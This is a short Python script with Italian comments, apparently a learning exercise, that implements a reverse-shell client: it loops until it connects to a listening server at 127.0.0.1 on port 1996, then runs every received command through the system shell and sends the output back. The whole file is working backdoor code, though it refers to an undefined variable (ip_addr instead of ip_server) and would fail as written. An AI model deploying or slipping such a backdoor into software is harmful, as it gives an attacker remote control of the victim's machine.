import socket, subprocess

ip_server = "127.0.0.1" #ip del server che sta ascoltando per la connessione
port_number = 1996 #porta sul server
conn = socket.socket()
while True:#continuo a provare finchè non riesco a connettermi al server
    try:
        conn.connect((ip_addr, port_number)) #mi sono connesso al server
        break #rompo il ciclo di connessione
    except (socket.error, socket.timeout):
        continue#aspetto per il server 

while True:#una volta connesso continuo ad ascoltare ad oltranza per nuovi comandi
    command = conn.recv(99999)
    result =  subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE) 
    #eseguo il comando su shell
    #senza fare lo spaw di una nuova
    result = result.stdout.read() + result.stderr.read() #mi prendo il risultato dell esecuzione del comando e lo invio al server
    conn.send(result)